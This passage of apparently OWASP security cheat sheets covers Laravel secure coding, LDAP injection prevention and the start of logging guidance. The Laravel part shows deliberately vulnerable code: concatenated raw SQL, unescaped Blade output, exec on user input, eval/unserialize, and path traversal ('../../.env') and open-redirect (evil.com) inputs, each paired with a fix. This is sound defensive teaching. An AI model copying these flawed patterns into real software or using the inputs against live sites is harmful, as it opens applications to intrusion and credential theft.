Providers define how users are retrieved from your persistent storage.\r\n\r\nLaravel ships with a `session` guard which maintains state using session storage and cookies, and a `token` guard for API tokens.\r\n\r\nFor providers, Laravel ships with a `eloquent` provider for retrieving users using the Eloquent ORM and the `database` provider for retrieving users using the database query builder.\r\n\r\nGuards and providers can be configured in the `config/auth.php` file. Laravel offers the ability to build custom guards and providers as well.\r\n\r\n### Starter Kits\r\n\r\nLaravel offers a wide variety of first party application starter kits that include in-built authentication features:\r\n\r\n1. [Laravel Breeze](https://laravel.com/docs/8.x/starter-kits#laravel-breeze): A simple, minimal implementation of all Laravel's authentication features including login, registration, password reset, email verification and password confirmation.\r\n2. [Laravel Fortify](https://laravel.com/docs/fortify): A headless authentication backend that includes the above authentication features along with two-factor authentication.\r\n3. [Laravel Jetstream](https://jetstream.laravel.com/): An application starter kit that provides a UI on top of Laravel Fortify's authentication features.\r\n\r\nIt is recommended to use one of these starter kits to ensure robust and secure authentication for your Laravel applications.\r\n\r\n### API Authentication Packages\r\n\r\nLaravel also offers the following API authentication packages:\r\n\r\n1. [Passport](https://laravel.com/docs/passport): An OAuth2 authentication provider.\r\n2. [Sanctum](https://laravel.com/docs/sanctum): An API token authentication provider.\r\n\r\nStarter kits such as Fortify and Jetstream have in-built support for Sanctum.\r\n\r\n## Mass Assignment\r\n\r\n[Mass assignment](Mass_Assignment_Cheat_Sheet.md) is a common vulnerability in modern web applications that use an ORM like Laravel's Eloquent ORM.\r\n\r\nA mass assignment is a vulnerability where an ORM pattern is abused to modify data items that the user should not be normally allowed to modify.\r\n\r\nConsider the following code:\r\n\r\n```php\r\nRoute::any('/profile', function (Request $request) {\r\n    $request->user()->forceFill($request->all())->save();\r\n\r\n    $user = $request->user()->fresh();\r\n\r\n    return response()->json(compact('user'));\r\n})->middleware('auth');\r\n```\r\n\r\nThe above profile route allows the logged in user to change their profile information.\r\n\r\nHowever, let's say there is an `is_admin` column in the users table. You probably do not want the user to be allowed to change the value of this column. However, the above code allows users to change any column values for their row in the users table. This is a mass assignment vulnerability.\r\n\r\nLaravel has in-built features by default to protect against this vulnerability. Make sure of the following to stay secure:\r\n\r\n- Qualify the allowed parameters that you wish to update using `$request->only` or `$request->validated` rather than `$request->all`.\r\n- Do not unguard models or set the `$guarded` variable to an empty array. By doing this, you are actually disabling Laravel's in-built mass assignment protection.\r\n- Avoid using methods such as `forceFill` or `forceCreate` that bypass the protection mechanism. You may however use these methods if you are passing in a validated array of values.\r\n\r\n## SQL Injection\r\n\r\nSQL Injection attacks are unfortunately quite common in modern web applications and entail attackers providing malicious request input data to interfere with SQL queries. This guide covers SQL injection and how it can be prevented specifically for Laravel applications. You may also refer the [SQL Injection Prevention Cheatsheet](SQL_Injection_Prevention_Cheat_Sheet.md) for more information that is not specific to Laravel.\r\n\r\n### Eloquent ORM SQL Injection Protection\r\n\r\nBy default, Laravel's Eloquent ORM protects against SQL injection by parameterizing queries and using SQL bindings. For instance, consider the following query:\r\n\r\n```php\r\nuse App\\Models\\User;\r\n\r\nUser::where('email', $email)->get();\r\n```\r\n\r\nThe code above fires the query below:\r\n\r\n```sql\r\nselect * from `users` where `email` = ?\r\n```\r\n\r\nSo, even if `$email` is untrusted user input data, you are protected from SQL injection attacks.\r\n\r\n### Raw Query SQL Injection\r\n\r\nLaravel also offers raw query expressions and raw queries to construct complex queries or database specific queries that aren't supported out of the box.\r\n\r\nWhile this is great for flexibility, you must be careful to always use SQL data bindings for such queries. Consider the following query:\r\n\r\n```php\r\nuse Illuminate\\Support\\Facades\\DB;\r\nuse App\\Models\\User;\r\n\r\nUser::whereRaw('email = \"'.$request->input('email').'\"')->get();\r\nDB::table('users')->whereRaw('email = \"'.$request->input('email').'\"')->get();\r\n```\r\n\r\nBoth lines of code actually execute the same query, which is vulnerable to SQL injection as the query does not use SQL bindings for untrusted user input data.\r\n\r\nThe code above fires the following query:\r\n\r\n```sql\r\nselect * from `users` where `email` = \"value of email query parameter\"\r\n```\r\n\r\nAlways remember to use SQL bindings for request data. We can fix the above code by making the following modification:\r\n\r\n```php\r\nuse App\\Models\\User;\r\n\r\nUser::whereRaw('email = ?', [$request->input('email')])->get();\r\n```\r\n\r\nWe can even use named SQL bindings like so:\r\n\r\n```php\r\nuse App\\Models\\User;\r\n\r\nUser::whereRaw('email = :email', ['email' => $request->input('email')])->get();\r\n```\r\n\r\n### Column Name SQL Injection\r\n\r\nYou must never allow user input data to dictate column names referenced by your queries.\r\n\r\nThe following queries may be vulnerable to SQL injection:\r\n\r\n```php\r\nuse App\\Models\\User;\r\n\r\nUser::where($request->input('colname'), 'somedata')->get();\r\nUser::query()->orderBy($request->input('sortBy'))->get();\r\n```\r\n\r\nIt is important to note that even though Laravel has some in-built features such as wrapping column names to protect against the above SQL injection vulnerabilities, some database engines (depending on versions and configurations) may still be vulnerable because binding column names is not supported by databases.\r\n\r\nAt the very least, this may result in a mass assignment vulnerability instead of a SQL injection because you may have expected a certain set of column values, but since they are not validated here, the user is free to use other columns as well.\r\n\r\nAlways validate user input for such situations like so:\r\n\r\n```php\r\nuse App\\Models\\User;\r\n\r\n$request->validate(['sortBy' => 'in:price,updated_at']);\r\nUser::query()->orderBy($request->validated()['sortBy'])->get();\r\n```\r\n\r\n### Validation Rule SQL Injection\r\n\r\nCertain validation rules have the option of providing database column names. Such rules are vulnerable to SQL injection in the same manner as column name SQL injection because they construct queries in a similar manner.\r\n\r\nFor example, the following code may be vulnerable:\r\n\r\n```php\r\nuse Illuminate\\Validation\\Rule;\r\n\r\n$request->validate([\r\n    'id' => Rule::unique('users')->ignore($id, $request->input('colname'))\r\n]);\r\n```\r\n\r\nBehind the scenes, the above code triggers the following query:\r\n\r\n```php\r\nuse App\\Models\\User;\r\n\r\n$colname = $request->input('colname');\r\nUser::where($colname, $request->input('id'))->where($colname, '<>', $id)->count();\r\n```\r\n\r\nSince the column name is dictated by user input, it is similar to column name SQL injection.\r\n\r\n## Cross Site Scripting (XSS)\r\n\r\n[XSS attacks](https://owasp.org/www-community/attacks/xss/) are injection attacks where malicious scripts (such as JavaScript code snippets) are injected into trusted websites.\r\n\r\nLaravel's [Blade templating engine](https://laravel.com/docs/blade) has echo statements `{{ }}` that automatically escape variables using the `htmlspecialchars` PHP function to protect against XSS attacks.\r\n\r\nLaravel also offers displaying unescaped data using the unescaped syntax `{!! !!}`. This must not be used on any untrusted data, otherwise your application will be subject to an XSS attack.\r\n\r\nFor instance, if you have something like this in any of your Blade templates, it would result in a vulnerability:\r\n\r\n```blade\r\n{!! request()->input('somedata') !!}\r\n```\r\n\r\nThis, however, is safe to do:\r\n\r\n```blade\r\n{{ request()->input('somedata') }}\r\n```\r\n\r\nFor other information on XSS prevention that is not specific to Laravel, you may refer the [Cross Site Scripting Prevention Cheatsheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md).\r\n\r\n## Unrestricted File Uploads\r\n\r\nUnrestricted file upload attacks entail attackers uploading malicious files to compromise web applications. This section describes how to protect against such attacks while building Laravel applications. You may also refer the [File Upload Cheatsheet](File_Upload_Cheat_Sheet.md) to learn more.\r\n\r\n### Always Validate File Type and Size\r\n\r\nAlways validate the file type (extension or MIME type) and file size to avoid storage DOS attacks and remote code execution:\r\n\r\n```php\r\n$request->validate([\r\n    'photo' => 'file|size:100|mimes:jpg,bmp,png'\r\n]);\r\n```\r\n\r\nStorage DOS attacks exploit missing file size validations and upload massive files to cause a denial of service (DOS) by exhausting the disk space.\r\n\r\nRemote code execution attacks entail first, uploading malicious executable files (such as PHP files) and then, triggering their malicious code by visiting the file URL (if public).\r\n\r\nBoth these attacks can be avoided by simple file validations as mentioned above.\r\n\r\n### Do Not Rely On User Input To Dictate Filenames or Path\r\n\r\nIf your application allows user controlled data to construct the path of a file upload, this may result in overwriting a critical file or storing the file in a bad location.\r\n\r\nConsider the following code:\r\n\r\n```php\r\nRoute::post('/upload', function (Request $request) {\r\n    $request->file('file')->storeAs(auth()->id(), $request->input('filename'));\r\n\r\n    return back();\r\n});\r\n```\r\n\r\nThis route saves a file to a directory specific to a user ID. Here, we rely on the `filename` user input data and this may result in a vulnerability as the filename could be something like `../2/filename.pdf`. This will upload the file in user ID 2's directory instead of the directory pertaining to the current logged in user.\r\n\r\nTo fix this, we should use the `basename` PHP function to strip out any directory information from the `filename` input data:\r\n\r\n```php\r\nRoute::post('/upload', function (Request $request) {\r\n    $request->file('file')->storeAs(auth()->id(), basename($request->input('filename')));\r\n\r\n    return back();\r\n});\r\n```\r\n\r\n### Avoid Processing ZIP or XML Files If Possible\r\n\r\nXML files can expose your application to a wide variety of attacks such as XXE attacks, the billion laughs attack and others. If you process ZIP files, you may be exposed to zip bomb DOS attacks.\r\n\r\nRefer the [XML Security Cheatsheet](XML_Security_Cheat_Sheet.md) and the [File Upload Cheatsheet](File_Upload_Cheat_Sheet.md) to learn more.\r\n\r\n## Path Traversal\r\n\r\nA path traversal attack aims to access files by manipulating request input data with `../` sequences and variations or by using absolute file paths.\r\n\r\nIf you allow users to download files by filename, you may be exposed to this vulnerability if input data is not stripped of directory information.\r\n\r\nConsider the following code:\r\n\r\n```php\r\nRoute::get('/download', function(Request $request) {\r\n    return response()->download(storage_path('content/').$request->input('filename'));\r\n});\r\n```\r\n\r\nHere, the filename is not stripped of directory information, so a malformed filename such as `../../.env` could expose your application credentials to potential attackers.\r\n\r\nSimilar to unrestricted file uploads, you should use the `basename` PHP function to strip out directory information like so:\r\n\r\n```php\r\nRoute::get('/download', function(Request $request) {\r\n    return response()->download(storage_path('content/').basename($request->input('filename')));\r\n});\r\n```\r\n\r\n## Open Redirection\r\n\r\nOpen Redirection attacks in themselves are not that dangerous but they enable phishing attacks.\r\n\r\nConsider the following code:\r\n\r\n```php\r\nRoute::get('/redirect', function (Request $request) {\r\n   return redirect($request->input('url'));\r\n});\r\n```\r\n\r\nThis code redirects the user to any external URL provided by user input. This could enable attackers to create seemingly safe URLs like `https://example.com/redirect?url=http://evil.com`. For instance, attackers may use a URL of this type to spoof password reset emails and lead victims to expose their credentials on the attacker's website.\r\n\r\n## Cross Site Request Forgery (CSRF)\r\n\r\n[Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) is a type of attack that occurs when a malicious web site, email, blog, instant message, or program causes a user's web browser to perform an unwanted action on a trusted site when the user is authenticated.\r\n\r\nLaravel provides CSRF protection out-of-the-box with the `VerifyCSRFToken` middleware. Generally, if you have this middleware in the `web` middleware group of your `App\\Http\\Kernel` class, you should be well protected:\r\n\r\n```php\r\n/**\r\n * The application's route middleware groups.\r\n *\r\n * @var array\r\n */\r\nprotected $middlewareGroups = [\r\n    'web' => [\r\n        ...\r\n         \\App\\Http\\Middleware\\VerifyCsrfToken::class,\r\n         ...\r\n    ],\r\n];\r\n```\r\n\r\nNext, for all your `POST` request forms, you may use the `@csrf` blade directive to generate the hidden CSRF input token fields:\r\n\r\n```html\r\n<form method=\"POST\" action=\"/profile\">\r\n    @csrf\r\n\r\n    <!-- Equivalent to... -->\r\n    <input type=\"hidden\" name=\"_token\" value=\"{{ csrf_token() }}\" />\r\n</form>\r\n```\r\n\r\nFor AJAX requests, you can setup the [X-CSRF-Token header](https://laravel.com/docs/csrf#csrf-x-csrf-token).\r\n\r\nLaravel also provides the ability to exclude certain routes from CSRF protection using the `$except` variable in your CSRF middleware class. Typically, you would want to exclude only stateless routes (e.g. APIs or webhooks) from CSRF protection. If any other routes are excluded, these may result in CSRF vulnerabilities.\r\n\r\n## Command Injection\r\n\r\nCommand Injection vulnerabilities involve executing shell commands constructed with unescaped user input data.\r\n\r\nFor example, the following code performs a `whois` on a user provided domain name:\r\n\r\n```php\r\npublic function verifyDomain(Request $request)\r\n{\r\n    exec('whois '.$request->input('domain'));\r\n}\r\n```\r\n\r\nThe above code is vulnerable as the user data is not escaped properly. To do so, you may use the `escapeshellcmd` and/or `escapeshellarg` PHP functions.\r\n\r\n## Other Injections\r\n\r\nObject injection, eval code injection and extract variable hijacking attacks involve unserializing, evaluating or using the `extract` function on untrusted user input data.\r\n\r\nSome examples are:\r\n\r\n```php\r\nunserialize($request->input('data'));\r\neval($request->input('data'));\r\nextract($request->all());\r\n```\r\n\r\nIn general, avoid passing any untrusted input data to these dangerous functions.\r\n\r\n## Security Headers\r\n\r\nYou should consider adding the following security headers to your web server or Laravel application middleware:\r\n\r\n- X-Frame-Options\r\n- X-Content-Type-Options\r\n- Strict-Transport-Security (for HTTPS only applications)\r\n- Content-Security-Policy\r\n\r\nFor more information, refer the [OWASP secure headers project](https://owasp.org/www-project-secure-headers/).\r\n\r\n## Tools\r\n\r\nYou should consider using [Enlightn](https://www.laravel-enlightn.com/), a static and dynamic analysis tool for Laravel applications that has over 45 automated security checks to identify potential security issues. There is both an open source version and a commercial version of Enlightn available. Enlightn includes an extensive 45 page documentation on security vulnerabilities and a great way to learn more on Laravel security is to just review its [documentation](https://www.laravel-enlightn.com/docs/security/).\r\n\r\nYou should also use the [Enlightn Security Checker](https://github.com/enlightn/security-checker) or the [Local PHP Security Checker](https://github.com/fabpot/local-php-security-checker). Both of them are open source packages, licensed under the MIT and AGPL licenses respectively, that scan your PHP dependencies for known vulnerabilities using the [Security Advisories Database](https://github.com/FriendsOfPHP/security-advisories).\r\n\r\n## References\r\n\r\n- [Laravel Documentation on Authentication](https://laravel.com/docs/authentication)\r\n- [Laravel Documentation on Authorization](https://laravel.com/docs/authorization)\r\n- [Laravel Documentation on CSRF](https://laravel.com/docs/csrf)\r\n- [Laravel Documentation on Validation](https://laravel.com/docs/validation)\r\n- [Enlightn SAST and DAST Tool](https://www.laravel-enlightn.com/)\r\n- [Laravel Enlightn Security Documentation](https://www.laravel-enlightn.com/docs/security/)\r\n"
    },
    {
      "LDAP_Injection_Prevention_Cheat_Sheet.md": "# LDAP Injection Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheatsheet is focused on providing clear, simple, actionable guidance for preventing LDAP Injection flaws in your applications.\r\n\r\nLDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it's possible to modify LDAP statements through techniques similar to [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection).\r\n\r\nLDAP injection attacks could result in the granting of permissions to unauthorized queries, and content modification inside the LDAP tree.\r\n\r\nFor more information on LDAP Injection attacks, visit [LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection).\r\n\r\n[LDAP injection](https://owasp.org/www-community/attacks/LDAP_Injection) attacks are common due to two factors:\r\n\r\n1. The lack of safer, parameterized LDAP query interfaces\r\n2. The widespread use of LDAP to authenticate users to systems.\r\n\r\nPrimary Defenses:\r\n\r\n- Escape all variables using the right LDAP encoding function\r\n\r\nAdditional Defenses:\r\n\r\n- Use a framework (like [LINQtoLDAP](https://www.nuget.org/packages/LinqToLdap/) that escapes automatically.\r\n\r\n## Primary Defenses\r\n\r\n### Defense Option 1: Escape all variables using the right LDAP encoding function\r\n\r\n#### Distinguished Name Escaping\r\n\r\nThe main way LDAP stores names is based on DN (distinguished name). You can think of this like a unique identifier. These are sometimes used to access resources, like a username.\r\n\r\nA DN might look like this\r\n\r\n`cn=Richard Feynman, ou=Physics Department, dc=Caltech, dc=edu`\r\n\r\nor\r\n\r\n`uid=inewton, ou=Mathematics Department, dc=Cambridge, dc=com`\r\n\r\nThere are certain characters that are considered special characters in a DN.\r\n\r\nThe [exhaustive list](https://ldapwiki.com/wiki/Wiki.jsp?page=DN%20Escape%20Values) is the following: `\\ # + < > , ; \" =` and leading or trailing spaces.\r\n\r\nSome \"special\" characters that are allowed in Distinguished Names and do not need to be escaped include:\r\n\r\n```text\r\n* ( ) . & - _ [ ] ` ~ | @ $ % ^ ? : { } ! '\r\n```\r\n\r\n#### Search Filter Escaping\r\n\r\nEach DN points to exactly 1 entry, which can be thought of sort of like a row in a RDBMS. For each entry, there will be 1 or more attributes which are analogous to RDBMS columns. If you are interested in searching through LDAP for users will certain attributes, you may do so with search filters.\r\n\r\nIn a search filter, you can use standard boolean logic to get a list of users matching an arbitrary constraint. Search filters are written in Polish notation AKA prefix notation.\r\n\r\nExample:\r\n\r\n```text\r\n(&(ou=Physics)(|\r\n(manager=cn=Freeman Dyson,ou=Physics,dc=Caltech,dc=edu)\r\n(manager=cn=Albert Einstein,ou=Physics,dc=Princeton,dc=edu)\r\n))\r\n```\r\n\r\nWhen building LDAP queries in application code, you MUST escape any untrusted data that is added to any LDAP query. There are two forms of LDAP escaping. Encoding for LDAP Search and Encoding for LDAP DN (distinguished name). The proper escaping depends on whether you are sanitizing input for a search filter, or you are using a DN as a username-like credential for accessing some resource.\r\n\r\nSome \"special\" characters that are allowed in search filters and must be escaped include:\r\n\r\n```text\r\n* ( ) \\ NUL\r\n```\r\n\r\nFor more information on search filter escaping visit [RFC4515](https://datatracker.ietf.org/doc/html/rfc4515#section-3).\r\n\r\n#### Safe Java Escaping Example\r\n\r\n- [Prevent LDAP injection](https://wiki.sei.cmu.edu/confluence/spaces/flyingpdf/pdfpageexport.action?pageId=88487534).\r\n- [Legacy OWASP ESAPI for Java DefaultEncoder which includes encodeForLDAP(String) and encodeForDN(String)](https://github.com/ESAPI/esapi-java-legacy/blob/develop/src/main/java/org/owasp/esapi/reference/DefaultEncoder.java).\r\n\r\n#### Safe C Sharp .NET TBA Example\r\n\r\n[.NET AntiXSS](https://blogs.msdn.microsoft.com/securitytools/2010/09/30/antixss-4-0-released/) (now the Encoder class) has LDAP encoding functions including `Encoder.LdapFilterEncode(string)`, `Encoder.LdapDistinguishedNameEncode(string)` and `Encoder.LdapDistinguishedNameEncode(string, bool, bool)`.\r\n\r\n`Encoder.LdapFilterEncode` encodes input according to [RFC4515](https://tools.ietf.org/search/rfc4515) where unsafe values are converted to `\\XX` where `XX` is the representation of the unsafe character.\r\n\r\n`Encoder.LdapDistinguishedNameEncode` encodes input according to [RFC2253](https://tools.ietf.org/html/rfc2253) where unsafe characters are converted to `#XX` where `XX` is the representation of the unsafe character and the comma, plus, quote, slash, less than and great than signs are escaped using slash notation (`\\X`). In addition to this a space or octothorpe (`#`) at the beginning of the input string is `\\` escaped as is a space at the end of a string.\r\n\r\n`LdapDistinguishedNameEncode(string, bool, bool)` is also provided so you may turn off the initial or final character escaping rules, for example if you are concatenating the escaped distinguished name fragment into the midst of a complete distinguished name.\r\n\r\n### Defense Option 2: Use Frameworks that Automatically Protect from LDAP Injection\r\n\r\nSafe NET Example\r\n\r\n[LINQ to Active Directory](https://linqtoad.codeplex.com) provides automatic LDAP encoding when building LDAP queries.\r\n\r\n### Defense Option 3: Additional Defenses\r\n\r\nBeyond adopting one of the two primary defenses, we also recommend adopting all of these additional defenses in order to provide defense in depth. These additional defenses are:\r\n\r\n- **Least Privilege**\r\n- **Allow-List Input Validation**\r\n\r\n#### Least Privilege\r\n\r\nTo minimize the potential damage of a successful LDAP injection attack, you should minimize the privileges assigned to the LDAP binding account in your environment.\r\n\r\n#### Enabling Bind Authentication\r\n\r\nIf LDAP protocol is configured with bind Authentication, attackers would not be able to perform LDAP injection attacks because of verification\r\nand authorization checks that are performed against valid credentials passed by the user.\r\nAn attacker can still bypass bind authentication through an anonymous connection or by exploiting the use of unauthenticated bind: Anonymous Bind (LDAP) and Unauthenticated Bind (LDAP).\r\n\r\n#### Allow-List Input Validation\r\n\r\nInput validation can be used to detect unauthorized input before it is passed to the LDAP query. For more information please see the [Input Validation Cheat Sheet](Input_Validation_Cheat_Sheet.md).\r\n\r\n## Related Articles\r\n\r\n- OWASP article on [LDAP Injection](https://owasp.org/www-community/attacks/LDAP_Injection) Vulnerabilities.\r\n- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/) article on how to [Test for LDAP Injection](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.html) Vulnerabilities.\r\n"
    },
    {
      "Logging_Cheat_Sheet.md": "# Logging Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheat sheet is focused on providing developers with concentrated guidance on building application logging mechanisms, especially related to security logging.\r\n\r\nMany systems enable network device, operating system, web server, mail server and database server logging, but often custom application event logging is missing, disabled or poorly configured. It provides much greater insight than infrastructure logging alone. Web application (e.g. web site or web service) logging is much more than having web server logs enabled (e.g. using Extended Log File Format).\r\n\r\nApplication logging should be consistent within the application, consistent across an organization's application portfolio and use industry standards where relevant, so the logged event data can be consumed, correlated, analyzed and managed by a wide variety of systems.\r\n\r\n## Purpose\r\n\r\nApplication logging should always be included for security events. Application logs are invaluable data for:\r\n\r\n- Identifying security incidents\r\n- Monitoring policy violations\r\n- Establishing baselines\r\n- Assisting non-repudiation controls (note that the trait non-repudiation is hard to achieve for logs because their trustworthiness is often just based on the logging party being audited properly while mechanisms like digital signatures are hard to utilize here)\r\n- Providing information about problems and unusual conditions\r\n- Contributing additional application-specific data for incident investigation which is lacking in other log sources\r\n- Helping defend against vulnerability identification and exploitation through attack detection\r\n\r\nApplication logging might also be used to record other types of events too such as:\r\n\r\n- Security events\r\n- Business process monitoring e.g. sales process abandonment, transactions, connections\r\n- Anti-automation monitoring\r\n- Audit trails e.g. data addition, modification and deletion, data exports\r\n- Performance monitoring e.g. data load time, page timeouts\r\n- Compliance monitoring\r\n- Data for subsequent requests for information e.g. data subject access, freedom of information, litigation, police and other regulatory investigations\r\n- Legally sanctioned interception of data e.g. application-layer wire-tapping\r\n- Other business-specific requirements\r\n\r\nProcess monitoring, audit, and transaction logs/trails etc. are usually collected for different purposes than security event logging, and this often means they should be kept separate.\r\n\r\nThe types of events and details collected will tend to be different.\r\n\r\nFor example a [PCIDSS](https://www.pcisecuritystandards.org/pci_security/) audit log will contain a chronological record of activities to provide an independently verifiable trail that permits reconstruction, review and examination to determine the original sequence of attributable transactions. It is important not to log too much, or too little.\r\n\r\nUse knowledge of the intended purposes to guide what, when and how much. The remainder of this cheat sheet primarily discusses security event logging.\r\n\r\n## Design, implementation, and testing\r\n\r\n### Event data sources\r\n\r\nThe application itself has access to a wide range of information events that should be used to generate log entries. Thus, the primary event data source is the application code itself.\r\n\r\nThe application has the most information about the user (e.g. identity, roles, permissions) and the context of the event (target, action, outcomes), and often this data is not available to either infrastructure devices, or even closely-related applications.\r\n\r\nOther sources of information about application usage that could also be considered are:\r\n\r\n- Client software e.g. actions on desktop software and mobile devices in local logs or using messaging technologies, JavaScript exception handler via Ajax, web browser such as using Content Security Policy (CSP) reporting mechanism\r\n- Embedded instrumentation code\r\n- Network firewalls\r\n- Network and host intrusion detection systems (NIDS and HIDS)\r\n- Closely-related applications e.g. filters built into web server software, web server URL redirects/rewrites to scripted custom error pages and handlers\r\n- Application firewalls e.g. filters, guards, XML gateways, database firewalls, web application firewalls (WAFs)\r\n- Database applications e.g. automatic audit trails, trigger-based actions\r\n- Reputation monitoring services e.g. uptime or malware monitoring\r\n- Other applications e.g. fraud monitoring, CRM\r\n- Operating system e.g. mobile platform\r\n\r\nThe degree of confidence in the event information has to be considered when including event data from systems in a different trust zone. Data may be missing, modified, forged, replayed and could be malicious – it must always be treated as untrusted data.\r\n\r\nConsider how the source can be verified, and how integrity and non-repudiation can be enforced.\r\n\r\n### Where to record event data\r\n\r\nApplications commonly write event log data to the file system or a database (SQL or NoSQL). Applications installed on desktops and on mobile devices may use local storage and local databases, as well as sending data to remote storage.\r\n\r\nYour selected framework may limit the available choices. All types of applications may send event data to remote systems (instead of or as well as more local storage).\r\n\r\nThis could be a centralized log collection and management system (e.g. SIEM or SEM) or another application elsewhere. Consider whether the application can simply send its event stream, unbuffered, to stdout, for management by the execution environment.\r\n\r\n- When using the file system, it is preferable to use a separate partition than those used by the operating system, other application files and user generated content\r\n    - For file-based logs, apply strict permissions concerning which users can access the directories, and the permissions of files within the directories\r\n    - In web applications, the logs should not be exposed in web-accessible locations, and if done so, should have restricted access and be configured with a plain text MIME type (not HTML)\r\n- When using a database, it is preferable to utilize a separate database account that is only used for writing log data and which has very restrictive database, table, function and command permissions\r\n- Use standard formats over secure protocols to record and send event data, or log files, to other systems e.g. Common Log File System (CLFS) or Common Event Format (CEF) over syslog; standard formats facilitate integration with centralised logging services\r\n\r\nConsider separate files/tables for extended event information such as error stack traces or a record of HTTP request and response headers and bodies.\r\n\r\n### Which events to log\r\n\r\nThe level and content of security monitoring, alerting, and reporting needs to be set during the requirements and design stage of projects, and should be proportionate to the information security risks. This can then be used to define what should be logged.\r\n\r\nThere is no one size fits all solution, and a blind checklist approach can lead to unnecessary \"alarm fog\" that means real problems go undetected.\r\n\r\nWhere possible, always log:\r\n\r\n- Input validation failures e.g. protocol violations, unacceptable encodings, invalid parameter names and values\r\n- Output validation failures e.g. database record set mismatch, invalid data encoding\r\n- Authentication successes and failures\r\n- Authorization (access control) failures\r\n- Session management failures e.g. cookie session identification value modification\r\n- Application errors and system events e.g. syntax and runtime errors, connectivity problems, performance issues, third party service error messages, file system errors, file upload virus detection, configuration changes\r\n- Application and related systems start-ups and shut-downs, and logging initialization (starting, stopping or pausing)\r\n- Use of higher-risk functionality e.g. network connections, addition or deletion of users, changes to privileges, assigning users to tokens, adding or deleting tokens, use of systems administrative privileges, access by application administrators, all actions by users with administrative privileges, access to payment cardholder data, use of data encrypting keys, key changes, creation and deletion of system-level objects, data import and export including screen-based reports, submission of user-generated content - especially file uploads\r\n- Legal and other opt-ins e.g. permissions for mobile phone capabilities, terms of use, terms & conditions, personal data usage consent, permission to receive marketing communications\r\n\r\nOptionally consider if the following events can be logged and whether it is desirable information:\r\n\r\n- Sequencing failure\r\n- Excessive use\r\n- Data changes\r\n- Fraud and other criminal activities\r\n- Suspicious, unacceptable, or unexpected behavior\r\n- Modifications to configuration\r\n- Application code file and/or memory changes\r\n\r\n### Event attributes\r\n\r\nEach log entry needs to include sufficient information for the intended subsequent monitoring and analysis. It could be full content data, but is more likely to be an extract or just summary properties.\r\n\r\nThe application logs must record \"when, where, who and what\" for each event.\r\n\r\nThe properties for these will be different depending on the architecture, class of application and host system/device, but often include the following:\r\n\r\n- When\r\n    - Log date and time (international format)\r\n    - Event date and time - the event timestamp may be different to the time of logging e.g. server logging where the client application is hosted on remote device that is only periodically or intermittently online\r\n    - Interaction identifier `Note A`\r\n- Where\r\n    - Application identifier e.g. name and version\r\n    - Application address e.g. cluster/hostname or server IPv4 or IPv6 address and port number, workstation identity, local device identifier\r\n    - Service e.g. name and protocol\r\n    - Geolocation\r\n    - Window/form/page e.g. entry point URL and HTTP method for a web application, dialogue box name\r\n    - Code location e.g. script name, module name\r\n- Who (human or machine user)\r\n    - Source address e.g. user's device/machine identifier, user's IP address, cell/RF tower ID, mobile telephone number\r\n    - User identity (if authenticated or otherwise known) e.g. user database table primary key value, user name, license number\r\n- What\r\n    - Type of event `Note B`\r\n    - Severity of event `Note B` e.g. `{0=emergency, 1=alert, ..., 7=debug}, {fatal, error, warning, info, debug, trace}`\r\n    - Security relevant event flag (if the logs contain non-security event data too)\r\n    - Description\r\n\r\nAdditionally consider recording:\r\n\r\n- Secondary time source (e.g. GPS) event date and time\r\n- Action - original intended purpose of the request e.g. Log in, Refresh session ID, Log out, Update profile\r\n- Object e.g. the affected component or other object (user account, data resource, file) e.g. URL, Session ID, User account, File\r\n- Result status - whether the ACTION aimed at the OBJECT was successful e.g. Success, Fail, Defer\r\n- Reason - why the status above occurred e.g. User not authenticated in database check ..., Incorrect credentials\r\n- HTTP Status Code (web applications only) - the status code returned to the user (often 200 or 301)\r\n- Request HTTP headers or HTTP User Agent (web applications only)\r\n- User type classification e.g. public, authenticated user, CMS user, search engine, authorized penetration tester, uptime monitor (see \"Data to exclude\" below)\r\n- Analytical confidence in the event detection `Note B` e.g. low, medium, high or a numeric value\r\n- Responses seen by the user and/or taken by the application e.g. status code, custom text messages, session termination, administrator alerts\r\n- Extended details e.g. stack trace, system error messages, debug information, HTTP request body, HTTP response headers and body\r\n- Internal classifications e.g. responsibility, compliance references\r\n- External classifications e.g. NIST Security Content Automation Protocol (SCAP), Mitre Common Attack Pattern Enumeration and Classification (CAPEC)\r\n\r\nFor more information on these, see the \"other\" related articles listed at the end, especially the comprehensive article by Anton Chuvakin and Gunnar Peterson.\r\n\r\n**Note A:** The \"Interaction identifier\" is a method of linking all (relevant) events for a single user interaction (e.g. desktop application form submission, web page request, mobile app button click, web service call). The application knows all these events relate to the same interaction, and this should be recorded instead of losing the information and forcing subsequent correlation techniques to re-construct the separate events. For example, a single SOAP request may have multiple input validation failures and they may span a small range of times. As another example, an output validation failure may occur much later than the input submission for a long-running \"saga request\" submitted by the application to a database server.\r\n\r\n**Note B:** Each organisation should ensure it has a consistent, and documented, approach to classification of events (type, confidence, severity), the syntax of descriptions, and field lengths & data types including the format used for dates/times.\r\n\r\n### Data to exclude\r\n\r\nNever log data unless it is legally sanctioned. For example, intercepting some communications, monitoring employees, and collecting some data without consent may all be illegal.\r\n\r\nNever exclude any events from \"known\" users such as other internal systems, \"trusted\" third parties, search engine robots, uptime/process and other remote monitoring systems, pen testers, auditors. However, you may want to include a classification flag for each of these in the recorded data.\r\n\r\nThe following should usually not be recorded directly in the logs, but instead should be removed, masked, sanitized, hashed, or encrypted:\r\n\r\n- Application source code\r\n- Session identification values (consider replacing with a hashed value if needed to track session specific events)\r\n- Access tokens\r\n- Sensitive personal data and some forms of personally identifiable information (PII) e.g. health, government identifiers, vulnerable people\r\n- Authentication passwords\r\n- Database connection strings\r\n- Encryption keys and other master secrets\r\n- Bank account or payment card holder data\r\n- Data of a higher security classification than the logging system is allowed to store\r\n- Commercially-sensitive information\r\n- Information it is illegal to collect in the relevant jurisdictions\r\n- Information a user has opted out of collection, or not consented to e.g. use of do not track, or where consent to collect has expired\r\n\r\nSometimes the following data can also exist, and 